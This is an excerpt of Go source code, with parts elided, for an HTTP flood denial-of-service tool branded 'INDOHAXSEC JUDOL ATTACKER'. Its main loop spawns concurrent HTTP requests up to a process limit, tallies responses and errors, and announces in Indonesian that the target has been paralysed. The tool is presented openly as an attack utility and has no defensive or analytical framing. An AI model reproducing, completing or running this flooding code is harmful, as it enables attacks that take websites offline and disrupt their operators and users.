...
func main() {
	...
	go func() {
		fmt.Println("\033[35;1m-- INDOHAXSEC \033[32;1mJUDOL ATTACKER --\033[0m")
		fmt.Println("\033[31;1mTOOLS BY K3T0PR4K-STARTING ATTACK.....\033[0m\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot error")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r\033[32;1m%6d of max %-6d |\t%7d |\t%6d\033[0m", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
			...
			case targetComplete:
				sent++
				fmt.Printf("\r\033[31;1m%-6d of max %-6d |\t%7d |\t%6d\033[0m", cur, maxproc, sent, err)
				fmt.Println("\r\033[31;1m-- TARGET DI LUMPUHKAN! --\033[0m       \n\n\r")
				os.Exit(0)
			}
		}
	}()
...
func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	...
	for {
		...
		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, "\033[31;1m"+e.Error()+"\033[0m")
